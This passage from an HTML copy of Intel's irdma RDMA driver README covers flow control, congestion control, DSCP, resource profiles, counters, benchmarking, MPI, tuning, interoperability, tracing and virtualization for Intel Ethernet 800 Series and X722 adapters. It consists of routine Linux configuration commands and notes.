</ol>
<p>Expected output:<br>        mode=auto</p>
<p>Switch DCB and PFC configuration syntax varies by vendor. Consult your switch<br>manual for details. Sample Arista switch configuration commands:</p>
<ul>
<li>Example: Enable PFC for priority 0 on switch port 21<ul>
<li>Enter configuration mode for switch port 21:<br>  switch#configure<br>  switch(config)#interface ethernet 21/1</li>
<li>Turn PFC on:<br>  switch(config-if-Et21/1)#priority-flow-control mode on</li>
<li>Set priority 0 for “no-drop” (i.e., PFC enabled):<br>  switch(config-if-Et21/1)#priority-flow-control priority 0 no-drop</li>
<li>Verify switch port PFC configuration:<br>  switch(config-if-Et21/1)#show priority-flow-control</li>
</ul>
</li>
<li>Example: Enable DCBX on switch port 21<ul>
<li>Enable DCBX in IEEE mode:<br>  switch(config-if-Et21/1)#dcbx mode ieee</li>
<li>Show DCBX settings (including neighbor port settings):<br>  switch(config-if-Et21/1)#show dcbx</li>
</ul>
</li>
</ul>
<p>*** PFC non-willing mode</p>
<p>In non-willing mode, DCB settings must be configured on both Intel Ethernet 800 Series and its link<br>partner. Non-willing mode is software-based. OpenLLDP (lldpad and lldptool) is<br>recommended.</p>
<p>To enable non-willing PFC on Intel Ethernet 800 Series:</p>
<ol>
<li>Disable firmware DCB. Firmware DCB is always willing. If enabled, it<br>will override any software settings.<pre><code>ethtool --set-priv-flags DEVNAME fw-lldp-agent off</code></pre>
</li>
<li>Install OpenLLDP<pre><code>yum install lldpad</code></pre>
</li>
<li>Start the Open LLDP daemon:<br>   lldpad -d</li>
<li>Verify functionality by showing current DCB settings on the NIC:<br>   lldptool -ti <ifname></ifname></li>
<li>Configure your desired DCB settings, including traffic classes,<br>bandwidth allocations, and PFC.<br>The following example enables PFC on priority 0, maps all priorities to<br>traffic class (TC) 0, and allocates all bandwidth to TC0.<br>This simple configuration is suitable for enabling PFC for all traffic,<br>which may be useful for back-to-back benchmarking. Datacenters will<br>typically use a more complex configuration to ensure quality-of-service<br>(QoS).<br>a. Enable PFC for priority 0:<pre><code>  lldptool -Ti &lt;interface&gt; -V PFC willing=no enabled=0</code></pre>
b. Map all priorities to TC0 and allocate all bandwidth to TC0:<pre><code>  lldptool -Ti &lt;interface&gt; -V ETS-CFG willing=no \
  up2tc=0:0,1:0,2:0,3:0,4:0,5:0,6:0,7:0 \
  tsa=0:ets,1:strict,2:strict,3:strict,4:strict,5:strict,6:strict,7:strict \
  tcbw=100,0,0,0,0,0,0,0</code></pre>
</li>
<li>Verify output of “lldptool -ti <interface>“:<br>   Chassis ID TLV<pre><code>   MAC: 68:05:ca:a3:89:78</code></pre>
   Port ID TLV<pre><code>   MAC: 68:05:ca:a3:89:78</code></pre>
   Time to Live TLV<pre><code>   120</code></pre>
   IEEE 8021QAZ ETS Configuration TLV<pre><code>   Willing: no
   CBS: not supported
   MAX_TCS: 8
   PRIO_MAP: 0:0 1:0 2:0 3:0 4:0 5:0 6:0 7:0
   TC Bandwidth: 100% 0% 0% 0% 0% 0% 0% 0%
   TSA_MAP: 0:ets 1:strict 2:strict 3:strict 4:strict 5:strict 6:strict 7:strict</code></pre>
   IEEE 8021QAZ PFC TLV<pre><code>   Willing: no
   MACsec Bypass Capable: no
   PFC capable traffic classes: 8
   PFC enabled: 0</code></pre>
   End of LLDPDU LTV</interface></li>
<li>Configure the same settings on the link partner.</li>
</ol>
<p>Full enablement of PFC requires the switch or link partner be configured for<br>PFC pause frames. Refer to switch vendor documentation for more details.</p>
<p>Additional notes and example:<br>    The 800 Series supports a maximum of four TCs, only one of which has PFC enabled.<br>    Traffic classes must be contiguous and must start at zero.<br>    ETS bandwidth allocations must total 100%.<br>    Multiple priorities can map to the same TC.<br>    Linux PFC defines eight TCs, but if you are steering traffic using ToS, there are only four priorities<br>    available: 0, 2, 4, and 6, which correspond with ToS 0, 8, 24, and 16 respectively.</p>
<p>The following example configures RDMA on Priority = 2 and TC = 2:<br>    Follow steps 1 - 5 for non-willing mode above. Then Configure DCB:<br>        a. Enable PFC for priority 2:<br>            lldptool -Ti <interface> -V PFC willing=no enabled=2<br>        b. Map all priorities to TC0, TC1 and TC2 and allocate all bandwidth to TC2:<br>            lldptool -Ti <interface> -V ETS-CFG willing=no up2tc=0:0,1:1,2:2,3:0,4:0,5:0,6:0,7:0 <br>            tsa=0:ets,1:ets,2:ets,3:strict,4:strict,5:strict,6:strict,7:strict tcbw=0,0,100,0,0,0,0,0<br>           Note: Even with 0 allocated BW on TC0 and TC1, traffic can still occur on those TC’s.<br>        c. Verify settings:<br>             lldptool -ti <interface><br>                Chassis ID TLV<br>                    MAC: 12:ce:dc:05:92:25<br>                Port ID TLV<br>                    MAC: 12:ce:dc:05:92:25<br>                Time to Live TLV<br>                    120<br>                IEEE 8021QAZ ETS Configuration TLV<br>                     Willing: no<br>                     CBS: not supported<br>                     MAX_TCS: 8<br>                     PRIO_MAP: 0:0 1:1 2:2 3:0 4:0 5:0 6:0 7:0<br>                     TC Bandwidth: 0% 0% 100% 0% 0% 0% 0% 0%<br>                     TSA_MAP: 0:ets 1:ets 2:ets 3:strict 4:strict 5:strict 6:strict 7:strict<br>                IEEE 8021QAZ PFC TLV<br>                     Willing: no<br>                     MACsec Bypass Capable: no<br>                     PFC capable traffic classes: 8<br>                     PFC enabled: 2<br>                End of LLDPDU TL<br>        d. Set the default TOS for all RoCEv2 traffic to 8 (which maps to priority 2):<br>            echo 8 &gt; /sys/kernel/config/rdma_cm/rdma<interface>/ports/1/default_roce_tos </interface></interface></interface></interface></p>
<p>— Directing RDMA traffic to a traffic class</p>
<p>When using PFC, traffic may be directed to one or more traffic classes (TCs).<br>Because RDMA traffic bypasses the kernel, Linux traffic control methods like<br>tc, cgroups, or egress-qos-map can’t be used. Instead, set the Type of Service<br>(ToS) field on your application command line. ToS-to-priority mappings are<br>hardcoded in Linux as follows:<br>  ToS   Priority</p>
<hr>
<p>   0       0<br>   8       2<br>  24       4<br>  16       6<br>Priorities are then mapped to traffic classes using ETS using lldptool or switch<br>utilities.</p>
<p>Examples of setting ToS 16 in an application:<br>  ucmatose -t 16<br>  ib_write_bw -t 16</p>
<p>Alternatively, for RoCEv2, ToS may be set for all RoCEv2 traffic using<br>configfs. For example, to set ToS 16 on device rdma<interface>, port 1:<br>  mkdir /sys/kernel/config/rdma_cm/rdma<interface><br>  echo 16 &gt; /sys/kernel/config/rdma_cm/rdma<interface>/ports/1/default_roce_tos</interface></interface></interface></p>
<hr>
<h2 id="ECN-Configuration"><a href="#ECN-Configuration" class="headerlink" title="ECN Configuration"></a>ECN Configuration</h2><p>X722:<br>Congestion control settings are not supported on X722.</p>
<p>Intel Ethernet 800 Series:<br>The Intel Ethernet 800 Series supports the following congestion control algorithms:<br>    - iWARP DCTCP<br>    - iWARP TCP New Reno plus ECN<br>    - iWARP TIMELY<br>    - RoCEv2 DCQCN<br>    - RoCEv2 DCTCP<br>    - RoCEv2 TIMELY</p>
<p>Congestion control settings are accessed through configfs. Additional DCQCN<br>tunings are available via module parameters.</p>
<p>— Configuration in configfs</p>
<p>To access congestion control settings:</p>
<ol>
<li><p>After driver load, change to the irdma configfs directory:</p>
<pre><code> cd /sys/kernel/config/irdma</code></pre>
</li>
<li><p>Create a new directory for each RDMA device you want to configure.<br>Note: Use “ibv_devices” for a list of RDMA devices.<br>For example, to create configfs entries for the rdmap<interface> device:</interface></p>
<pre><code> mkdir rdmap&lt;interface&gt;</code></pre>
</li>
<li><p>List the new directory to get its dynamic congestion control knobs and<br>values:</p>
<pre><code> cd rdmap&lt;interface&gt;
 for f in *; do echo -n &quot;$f: &quot;; cat &quot;$f&quot;; done;</code></pre>
<p> If the interface is in iWARP mode, the files have a “iw_” prefix:</p>
<pre><code> - iw_dctcp_enable
 - iw_ecn_enable
 - iw_timely_enable</code></pre>
<p> If the interface is in RoCEv2 mode, the files have a “roce_” prefix:</p>
<pre><code> - roce_dcqcn_enable
 - roce_dctcp_enable
 - roce_timely_enable</code></pre>
</li>
<li><p>Enable or disable the desired algorithms.</p>
<p>To enable an algorithm: echo 1 &gt; <attribute><br>For example, to add ECN marker processing to the default TCP New Reno iWARP<br>congestion control algorithm:</attribute></p>
<pre><code> echo 1 &gt; /sys/kernel/config/irdma/rdmap&lt;interface&gt;/iw_ecn_enable</code></pre>
<p> To disable an algorithm: echo 0 &gt; <attribute><br> For example:</attribute></p>
<pre><code> echo 0 &gt; /sys/kernel/config/irdma/rdmap&lt;interface&gt;/iw_ecn_enable</code></pre>
<p> To read the current status: cat <attribute></attribute></p>
<p> Default values:</p>
<pre><code> iwarp_dctcp_en: off
 iwarp_timely_en: off
 iwarp_ecn_en: ON

 roce_timely_en: off
 roce_dctcp_en: off
 roce_dcqcn_en: off</code></pre>
</li>
<li><p>Remove the configfs directory created above. Without removing these<br>directories, the driver will not unload.</p>
<pre><code>   rmdir /sys/kernel/config/irdma/rdmap&lt;interface&gt;</code></pre>
</li>
</ol>
<p>— Advanced Congestion Control Knobs</p>
<p>Module parameters on Intel Ethernet 800 Series for RoCEv2 DCQCN tuning:<br>        dcqcn_enable<br>            Enables the DCQCN algorithm for RoCEv2.<br>            Note: “roce_ena” must also be set to “true”.<br>        dcqcn_cc_cfg_valid<br>            Indicates that all DCQCN parameters are valid and should be updated<br>            in registers or QP context.<br>        dcqcn_min_dec_factor<br>            The minimum factor by which the current transmit rate can be<br>            changed when processing a CNP. Value is given as a percentage<br>            (1-100).<br>        dcqcn_min_rate<br>            The minimum value, in Mbits per second, for rate to limit.<br>        dcqcn_F<br>            The number of times to stay in each stage of bandwidth recovery.<br>        dcqcn_T<br>            The number of microseconds that should elapse before increasing the<br>            CWND in DCQCN mode.<br>        dcqcn_B<br>            The number of bytes to transmit before updating CWND in DCQCN mode.<br>        dcqcn_rai_factor<br>            The number of MSS to add to the congestion window in additive<br>            increase mode.<br>        dcqcn_hai_factor<br>            The number of MSS to add to the congestion window in hyperactive<br>            increase mode.<br>        dcqcn_rreduce_mperiod<br>            The minimum time between 2 consecutive rate reductions for a single<br>            flow. Rate reduction will occur only if a CNP is received during<br>            the relevant time interval.</p>
<hr>
<h2 id="DSCP-Configuration"><a href="#DSCP-Configuration" class="headerlink" title="DSCP Configuration"></a>DSCP Configuration</h2><p>The ice driver supports setting DSCP-based Layer 3 Quality of Service (L3 QoS) in the PF driver.</p>
<p>The following is an example of how to map all RoCEv2 traffic to a DSCP/ToS:</p>
<ol>
<li>Map a DSCP/ToS to a TC<br>lldptool -T -i <ethX> -V APP app=<prio>,<sel>,<pid><br> where:<br>   <prio>: The TC assigned to the DSCP/ToS code point<br>   <sel>: 5 for DSCP to TC mapping<br>   <pid>: The DSCP/ToS code point<br>For example, to map DSCP value 63 to traffic class 0:<br> lldptool -T -i eth0 -V APP app=0,5,63</pid></sel></prio></pid></sel></prio></ethX></li>
<li>Set the default_roce_tos<br>Since the ToS field is 8 bits and the DSCP field is only 6 bits, set the ToS value to<br>4 X DSCP value(4 X 63 = 252):<br>mkdir /sys/kernel/config/rdma_cm/rdma<interface><br>echo 252 &gt; /sys/kernel/config/rdma_cm/rdma<interface>/ports/1/default_roce_tos</interface></interface></li>
</ol>
<p>NOTE:<br>  L3 QoS mode is not available when FW-LLDP is enabled. You also cannot enable<br>  FW-LLDP if L3 QoS mode is active. Please see the “L3 QoS mode” section, in the ice README,<br>  for more details.</p>
<hr>
<h2 id="Memory-Requirements"><a href="#Memory-Requirements" class="headerlink" title="Memory Requirements"></a>Memory Requirements</h2><p>Default irdma initialization requires a minimum of ~210 MB (for Intel Ethernet 800 Series) or<br>~160 MB (for X722) of memory per port.</p>
<p>For servers where the amount of memory is constrained, you can decrease the<br>required memory by lowering the resources available to Intel Ethernet 800 Series or X722 by loading<br>the driver with the following resource profile setting:</p>
<pre><code>modprobe irdma resource_profile=2</code></pre>
<p>To automatically apply the setting when the driver is loaded, add the following<br>to /etc/modprobe.d/irdma.conf:<br>    options irdma resource_profile=2</p>
<p>Note: This can have performance and scaling impacts as the number of queue<br>pairs and other RDMA resources are decreased in order to lower memory usage to<br>approximately 55 MB (for Intel Ethernet 800 Series) or 51 MB (for X722) per port.</p>
<hr>
<h2 id="Resource-Profiles"><a href="#Resource-Profiles" class="headerlink" title="Resource Profiles"></a>Resource Profiles</h2><p>Resource profiles determine how resources are allocated between PFs and VFs.<br>Please see the Virtualization section for more information on profiles.</p>
<p>In the default resource profile, the RDMA resources configured for each<br>adapter are as follows:</p>
<pre><code>Intel Ethernet 800 Series (2 ports):
    Queue Pairs: 4092
    Completion Queues: 8189
    Memory Regions: 4194302
X722 (4 ports):
    Queue Pairs: 1020
    Completion Queues: 2045
    Memory Regions: 2097150</code></pre>
<p>For resource profile 2, the configuration is:</p>
<pre><code>Intel Ethernet 800 Series (2 ports):
    Queue Pairs: 508
    Completion Queues: 1021
    Memory Regions: 524286

X722 (4 ports):
    Queue Pairs: 252
    Completion Queues: 509
    Memory Regions: 524286</code></pre>
<hr>
<h2 id="Resource-Limits-Selector"><a href="#Resource-Limits-Selector" class="headerlink" title="Resource Limits Selector"></a>Resource Limits Selector</h2><p>In addition to resource profile, you can further limit resources via the<br>“limits_sel” module parameter:</p>
<p>Intel Ethernet 800 Series:<br>    modprobe irdma limits_sel=&lt;0-6&gt;<br>X722:<br>    modprobe irdma gen1_limits_sel=&lt;0-5&gt;</p>
<p>To automatically apply this setting when the driver is loaded, add the<br>following to /etc/modprobe.d/irdma.conf:<br>    options irdma limits_sel=<value></value></p>
<p>The values below apply to a 2-port Intel Ethernet 800 Series.<br>        0 - Minimum, up to 124 QPs<br>        1 - Up to 1020 QPs<br>        2 - Up to 2044 QPs<br>        3 - Default, up to 4092 QPs<br>        4 - Up to 16380 QPs<br>        5 - Up to 65532 QPs<br>        6 - Maximum, up to 131068 QPs</p>
<p>For X722, the resource limit selector defaults to a value of 1 and provides<br>2K QPs. A single X722 port supports a maximum of 32k QPs, and a 4-port X722<br>supports up to 8k QPs per port.</p>
<hr>
<h2 id="RDMA-Statistics"><a href="#RDMA-Statistics" class="headerlink" title="RDMA Statistics"></a>RDMA Statistics</h2><p>RDMA protocol statistics for Intel Ethernet 800 Series or X722 are found in sysfs. To display all<br>counters and values:<br>    cd /sys/class/infiniband/rdmap<interface>/hw_counters;<br>    for f in *; do echo -n “$f: “; cat “$f”; done;</interface></p>
<p>The following counters will increment when RDMA applications are transferring<br>data over the network in iWARP mode:<br>    - tcpInSegs<br>    - tcpOutSegs</p>
<p>Available counters:<br>    ip4InDiscards       IPv4 packets received and discarded.<br>    ip4InReasmRqd       IPv4 fragments received by Protocol Engine.<br>    ip4InMcastOctets    IPv4 multicast octets received.<br>    ip4InMcastPkts      IPv4 multicast packets received.<br>    ip4InOctets         IPv4 octets received.<br>    ip4InPkts           IPv4 packets received.<br>    ip4InTruncatedPkts  IPv4 packets received and truncated due to insufficient<br>                          buffering space in UDA RQ.<br>    ip4OutSegRqd        IPv4 fragments supplied by Protocol Engine to the lower<br>                          layers for transmission<br>    ip4OutMcastOctets   IPv4 multicast octets transmitted.<br>    ip4OutMcastPkts     IPv4 multicast packets transmitted.<br>    ip4OutNoRoutes      IPv4 datagrams discarded due to routing problem (no hit<br>                          in ARP table).<br>    ip4OutOctets        IPv4 octets supplied by the PE to the lower layers for<br>                           transmission.<br>    ip4OutPkts          IPv4 packets supplied by the PE to the lower layers for<br>                          transmission.<br>    ip6InDiscards       IPv6 packets received and discarded.<br>    ip6InReasmRqd       IPv6 fragments received by Protocol Engine.<br>    ip6InMcastOctets    IPv6 multicast octets received.<br>    ip6InMcastPkts      IPv6 multicast packets received.<br>    ip6InOctets         IPv6 octets received.<br>    ip6InPkts           IPv6 packets received.<br>    ip6InTruncatedPkts  IPv6 packets received and truncated due to insufficient<br>                          buffering space in UDA RQ.<br>    ip6OutSegRqd        IPv6 fragments received by Protocol Engine<br>    ip6OutMcastOctets   IPv6 multicast octets transmitted.<br>    ip6OutMcastPkts     IPv6 multicast packets transmitted.<br>    ip6OutNoRoutes      IPv6 datagrams discarded due to routing problem (no hit<br>                           in ARP table).<br>    ip6OutOctets        IPv6 octets supplied by the PE to the lower layers for<br>                           transmission.<br>    ip6OutPkts          IPv6 packets supplied by the PE to the lower layers for<br>                           transmission.<br>    iwInRdmaReads       RDMAP total RDMA read request messages received.<br>    iwInRdmaSends       RDMAP total RDMA send-type messages received.<br>    iwInRdmaWrites      RDMAP total RDMA write messages received.<br>    iwOutRdmaReads      RDMAP total RDMA read request messages sent.<br>    iwOutRdmaSends      RDMAP total RDMA send-type messages sent.<br>    iwOutRdmaWrites     RDMAP total RDMA write messages sent.<br>    iwRdmaBnd           RDMA verbs total bind operations carried out.<br>    iwRdmaInv           RDMA verbs total invalidate operations carried out.<br>    RxECNMrkd           Number of packets that have the ECN bits set to<br>                           indicate congestion<br>    cnpHandled          Number of Congestion Notification Packets that have<br>                           been handled by the reaction point.<br>    cnpIgnored          Number of Congestion Notification Packets that have<br>                           been ignored by the reaction point.<br>    rxVlanErrors        Ethernet received packets with incorrect VLAN_ID.<br>    tcpRetransSegs      Total number of TCP segments retransmitted.<br>    tcpInOptErrors      TCP segments received with unsupported TCP options or<br>                           TCP option length errors.<br>    tcpInProtoErrors    TCP segments received that are dropped by TRX due to<br>                           TCP protocol errors.<br>    tcpInSegs           TCP segments received.<br>    tcpOutSegs          TCP segments transmitted.<br>    cnpSent             Number of Congestion Notification Packets that have<br>                           been sent by the reaction point.<br>    RxUDP               UDP segments received without errors<br>    TxUDP               UDP segments transmitted without errors</p>
<hr>
<h2 id="perftest"><a href="#perftest" class="headerlink" title="perftest"></a>perftest</h2><p>The perftest package is a set of RDMA microbenchmarks designed to test<br>bandwidth and latency using RDMA verbs. The package is maintained upstream<br>here: <a href="https://github.com/linux-rdma/perftest" target="_blank" rel="noopener">https://github.com/linux-rdma/perftest</a></p>
<p>perftest-4.5-0.2 is recommended.</p>
<p>Earlier versions of perftest had known issues with iWARP that have since been<br>fixed. Versions 4.4-0.4 through 4.4-0.18 are therefore NOT recommended.</p>
<p>To run a basic ib_write_bw test:<br>    1. Start server<br>           ib_write_bw -R<br>    2. Start client:<br>           ib_write_bw -R <IP address of server><br>    3. Benchmark will run to completion and print performance data on both<br>       client and server consoles.</IP></p>
<p>Notes:<br>    - The “-R” option is required for iWARP and optional for RoCEv2.<br>    - Use “-d <device>“ on the perftest command lines to use a specific RDMA<br>      device.<br>    - For ib_read_bw, use “-o 1” for testing with 3rd-party link partners.<br>    - For ib_send_lat and ib_write lat, use “-I 96” to limit inline data size<br>      to the supported value.<br>    - iWARP supports only RC connections.<br>      RoCEv2 supports RC and UD.<br>      Connection types XRC, UC, and DC are not supported.<br>    - Atomic operations are not supported on Intel Ethernet 800 Series or X722.</device></p>
<hr>
<h2 id="MPI-Testing"><a href="#MPI-Testing" class="headerlink" title="MPI Testing"></a>MPI Testing</h2><p>— Intel MPI<br>Intel MPI uses the OpenFabrics Interfaces (OFI) framework and libfabric user<br>space libraries to communicate with network hardware.</p>
<ul>
<li><p>Recommended Intel MPI versions:<br>  Single-rail: Intel MPI 2019u8<br>  Multi-rail:  Intel MPI 2019u3</p>
<p>Note: Intel MPI 2019u4 is not recommended due to known incompatibilities with</p>
<pre><code>  iWARP.</code></pre>
</li>
<li><p>Recommended libfabric version: libfabric-1.11.0 or the latest release</p>
<p>The Intel MPI package includes a version of libfabric. This “internal”<br>version is automatically installed along with Intel MPI and used by default.<br>To use a different (“external”) version of libfabric with Intel MPI:</p>
<pre><code>1. Download libfabric from https://github.com/ofiwg/libfabric.
2. Build and install it according to the libfabric documentation.
3. Configure Intel MPI to use a non-internal version of libfabric:
       export I_MPI_OFI_LIBRARY_INTERNAL=0
   or  source &lt;installdir&gt;/intel64/bin/mpivars.sh -ofi_internal=0
4. Verify your libfabric version by using the I_MPI_DEBUG environment
   variable on the mpirun command line:
       -genv I_MPI_DEBUG=1
   The libfabric version will appear in the mpirun output.</code></pre>
</li>
<li><p>Sample command line for a 2-process pingpong test:</p>
<p>   mpirun -l -n 2 -ppn 1 -host myhost1,myhost2 -genv I_MPI_DEBUG=5 <br>   -genv FI_VERBS_MR_CACHE_ENABLE=1 -genv FI_VERBS_IFACE=<interface> <br>   -genv FI_OFI_RXM_USE_SRX=0 -genv FI_PROVIDER=’verbs;ofi_rxm’ <br>   /path/to/IMB-MPI1 Pingpong</interface></p>
<p>Notes:</p>
<ul>
<li>Example is for libfabrics 1.8 or greater. For earlier versions, use<br>“-genv FI_PROVIDER=’verbs’”</li>
<li>SRQ is not supported, set FI_OFI_RXM_USE_SRX=0</li>
<li>For Intel MPI 2019u6, use “-genv MPIR_CVAR_CH4_OFI_ENABLE_DATA=0”.</li>
<li>When using Intel MPI, it’s recommended to enable only one interface on<br>your networking device to avoid MPI application connectivity issues or<br>hangs. This issue affects all Intel MPI transports, including TCP and<br>RDMA. To avoid the issue, use “ifdown <interface>“ or “ip link set down<br><interface>“ to disable all network interfaces on your adapter except for<br>the one used for MPI.</interface></interface></li>
</ul>
</li>
</ul>
<p>— OpenMPI</p>
<ul>
<li>OpenMPI version 4.0.3 is recommended.</li>
</ul>
<hr>
<h2 id="Performance"><a href="#Performance" class="headerlink" title="Performance"></a>Performance</h2><p>RDMA performance may be optimized by adjusting system, application, or driver<br>settings.</p>
<ul>
<li><p>Flow control is required for best performance in RoCEv2 mode and is optional<br>in iWARP mode. Both link-level flow control (LFC) and priority flow control<br>(PFC) are supported, but PFC is recommended. See the “Flow Control Settings”<br>section of this document for configuration details.</p>
</li>
<li><p>For bandwidth applications, multiple queue pairs (QPs) are required for best<br>performance. For example, in the perftest suite, use “-q 8” on the command<br>line to run with 8 QP.</p>
</li>
<li><p>For best results, configure your application to use CPUs on the same NUMA<br>node as your adapter. For example:</p>
<ul>
<li>To list CPUs local to your NIC:<br>  cat /sys/class/infiniband/<interface>/device/local_cpulist</interface></li>
<li>To specify CPUs (e.g., 27-47) when running a perftest application:<br>  taskset -c 24-47 ib_write_bw <test options></test></li>
<li>To specify CPUs when running an Intel MPI application:<br>  mpirun <options> -genv I_MPI_PIN_PROCESSOR_LIST=24-47 ./my_prog</options></li>
</ul>
</li>
<li><p>For some workloads, latency may be improved by enabling push_mode in the<br>irdma driver.</p>
<ul>
<li>Create the configfs directory for your RDMA device:<br>  mkdir /sys/kernel/config/irdma/rdmap<interface></interface></li>
<li>Enable push_mode:<br>  echo 1 &gt; /sys/kernel/config/irdma/rdmap<interface>/push_mode</interface></li>
<li>Remove the directory<br>  rmdir /sys/kernel/config/irdma/rdmap<interface></interface></li>
</ul>
</li>
<li><p>System and BIOS tunings may also improve performance. Settings vary by<br>platform - consult your OS and BIOS documentation for details.<br>In general:</p>
<ul>
<li>Disable power-saving features such as P-states and C-states</li>
<li>Set BIOS CPU power policies to “Performance” or similar</li>
<li>Set BIOS CPU workload configuration to “I/O Sensitive” or similar</li>
<li>On RHEL 7.<em>/8.</em>, use the “latency-performance” tuning profile:<br>   tuned-adm profile latency-performance</li>
</ul>
</li>
</ul>
<hr>
<h2 id="Interoperability"><a href="#Interoperability" class="headerlink" title="Interoperability"></a>Interoperability</h2><p>— Mellanox</p>
<p>Intel Ethernet 800 Series and X722 support interop with Mellanox RoCEv2-capable adapters.</p>
<p>In tests like ib_send_bw, use -R option to select rdma_cm for connection<br>establishment. You can also use gid-index with -x option instead of -R:</p>
<p>Example:<br>    On Intel Ethernet 800 Series or X722:  ib_send_bw -F -n 5 -x 0<br>    On Mellanox           :  ib_send_bw -F -n 5 -x <gid-index for rocev2> <ip></ip></gid-index></p>
<pre><code>...where x specifies the gid index value for RoCEv2.</code></pre>
<p>Look in /sys/class/infiniband/mlx5_0/ports/1/gid_attrs/types directory for<br>port 1.</p>
<p>Note: Using RDMA reads with Mellanox may result in poor performance if there is<br>      packet loss.</p>
<p>— Chelsio</p>
<p>X722 supports interop with Chelsio iWARP devices.</p>
<p>Load Chelsio T4/T5 RDMA driver (iw_cxgb4) with parameter “dack_mode” set to 0.</p>
<pre><code>modprobe iw_cxgb4 dack_mode=0</code></pre>
<p>To automatically apply this setting when the iw_cxgb4 driver is loaded, add the<br>following to /etc/modprobe.d/iw_cxgb4.conf:<br>    options iw_cxgb4 dack_mode=0</p>
<hr>
<h2 id="Dynamic-Tracing"><a href="#Dynamic-Tracing" class="headerlink" title="Dynamic Tracing"></a>Dynamic Tracing</h2><p>Dynamic tracing is available for irdma’s connection manager.<br>Turn on tracing with the following command:<br>    echo 1 &gt; /sys/kernel/debug/tracing/events/irdma_cm/enable</p>
<p>To retrieve the trace:<br>    cat /sys/kernel/debug/tracing/trace</p>
<hr>
<h2 id="Dynamic-Debug"><a href="#Dynamic-Debug" class="headerlink" title="Dynamic Debug"></a>Dynamic Debug</h2><p>irdma support Linux dynamic debug.</p>
<p>To enable all dynamic debug messages upon irdma driver load, use the “dyndbg”<br>module parameter:<br>    modprobe irdma dyndbg=’+p’</p>
<p>Debug messages will then appear in the system log or dmesg.</p>
<p>Enabling dynamic debug can be extremely verbose and is not recommended for<br>normal operation. For more info on dynamic debug, including tips on how to<br>refine the debug output, see:<br>   <a href="https://www.kernel.org/doc/html/v4.11/admin-guide/dynamic-debug-howto.html" target="_blank" rel="noopener">https://www.kernel.org/doc/html/v4.11/admin-guide/dynamic-debug-howto.html</a></p>
<hr>
<h2 id="Capturing-RDMA-Traffic-with-tcpdump"><a href="#Capturing-RDMA-Traffic-with-tcpdump" class="headerlink" title="Capturing RDMA Traffic with tcpdump"></a>Capturing RDMA Traffic with tcpdump</h2><p>RDMA traffic bypasses the kernel and is not normally available to the Linux<br>tcpdump utility. You may capture RDMA traffic with tcpdump by using port<br>mirroring on a switch.</p>
<ol>
<li><p>Connect 3 hosts to a switch:</p>
<ul>
<li>2 compute nodes to run RDMA traffic</li>
<li>1 host to monitor traffic</li>
</ul>
</li>
<li><p>Configure the switch to mirror traffic from one compute node’s switch port<br>to the monitoring host’s switch port. Consult your switch documentation<br>for syntax.</p>
</li>
<li><p>Unload the irdma driver on the monitoring host:</p>
<h1 id="rmmod-irdma"><a href="#rmmod-irdma" class="headerlink" title="rmmod irdma"></a>rmmod irdma</h1><p>Traffic may not be captured correctly if the irdma driver is loaded.</p>
</li>
<li><p>Start tcpdump on the monitoring host. For example:</p>
<h1 id="tcpdump-nXX-i"><a href="#tcpdump-nXX-i" class="headerlink" title="tcpdump -nXX -i "></a>tcpdump -nXX -i <interface></interface></h1></li>
<li><p>Run RDMA traffic between the 2 compute nodes. RDMA packets will appear in<br>tcpdump on the monitoring host.</p>
</li>
</ol>
<hr>
<h2 id="Virtualization"><a href="#Virtualization" class="headerlink" title="Virtualization"></a>Virtualization</h2><p>The irdma driver supports virtualization on Intel Ethernet 800 Series only and requires<br>the iavf driver. Please refer to its README for installation instructions.</p>
<p>Loading the drivers:<br>Load the ice driver on the host and enable virtualization by setting the<br>number of VFs. For example, to set 2 VFs:<br>  echo 2 &gt; /sys/class/net/p4p1/device/sriov_numvfs</p>
<p>Reload the irdma driver, on the host, with a VF specific resource_profile and<br>set the number of VFs needed.<br>The resource_profile value is one of the following:<br>  0 = PF only(default), no VF support, all resources assigned to PFs<br>  1 = Weighted VF, most resources assigned to the VFs, the PF gets minimal resources<br>  2 = Even Distribution, resources are distributed evenly among PFs and VFs</p>
<p>For example:<br>  modprobe irdma resource_profile=2 max_rdma_vfs=2</p>
<p>Next, start the VM and make sure the iavf and irdma drivers are loaded. For example:<br>  modprobe iavf<br>  modprobe irdma</p>
<p>Notes:</p>
<ul>
<li>The irdma driver must be loaded on the host when the VM is started. Otherwise,<br>the iavf must be reloaded to enable RDMA functionality.</li>
<li>If the irdma driver on the host is unloaded, then any client VFs will require<br>the iavf to be reloaded.</li>
</ul>
<hr>
<h2 id="Known-Issues-Notes"><a href="#Known-Issues-Notes" class="headerlink" title="Known Issues/Notes"></a>Known Issues/Notes</h2><p>X722:</p>
<ul>
<li><p>Support for the Intel(R) Ethernet Connection X722 iWARP RDMA VF driver<br>(i40iwvf) has been discontinued.</p>
</li>
<li><p>There may be incompatible drivers in the initramfs image. You can either<br>update the image or remove the drivers from initramfs.</p>
</li>
</ul>
<p>Specifically, look for i40e, ib_addr, ib_cm, ib_core, ib_mad, ib_sa, ib_ucm,<br>ib_uverbs, iw_cm, rdma_cm, rdma_ucm in the output of the following command:<br>  lsinitrd |less<br>If you see any of those modules, rebuild initramfs with the following command<br>and include the name of the module in the “” list. For example:<br>  dracut –force –omit-drivers “i40e ib_addr ib_cm ib_core ib_mad ib_sa<br>  ib_ucm ib_uverbs iw_cm rdma_cm rdma_ucm”</p>
<p>Intel Ethernet 800 Series:</p>
<ul>
<li><p>RDMA is not supported when Intel Ethernet 800 Series is configured for more than 4 ports.</p>
</li>
<li><p>Intel Ethernet 800 Series is limited to 4 traffic classes (TCs), one of which may be enabled for<br>priority flow control (PFC).</p>
</li>
<li><p>When using RoCEv2 on Linux kernel version 5.9 or earlier, some iSER operations<br>may experience errors related to iSER’s handling of work requests. To work<br>around this issue, set the Intel Ethernet 800 Series fragment_count_limit module parameter to 13.</p>
</li>
<li><p>RoCEv2 devices require application level flow control in order to prevent message<br>loss due to insufficient receive buffers. The libfabric RxM provider implements application<br>level flow control for RDM endpoints running over RoCEv2 queue pairs.  The recommended way<br>to specify the provider in the RDM tests (e.g. fi_rdm) is with -p “ofi_rxm;verbs”.</p>
</li>
</ul>
<p>However, message endpoint tests (e.g. fi_msg_bw) which don’t support the libfabric RxM<br>provider use the verbs provider with -p “verbs” directly and can fail without application<br>level flow control.</p>
<ul>
<li>iWARP and RoCEv2 do not interoperate. Configure Intel Ethernet 800 Series to use the same protocol(iWARP/<br>RoCEv2) as its connection partner.</li>
</ul>
<p>X722 and Intel Ethernet 800 Series:</p>
<ul>
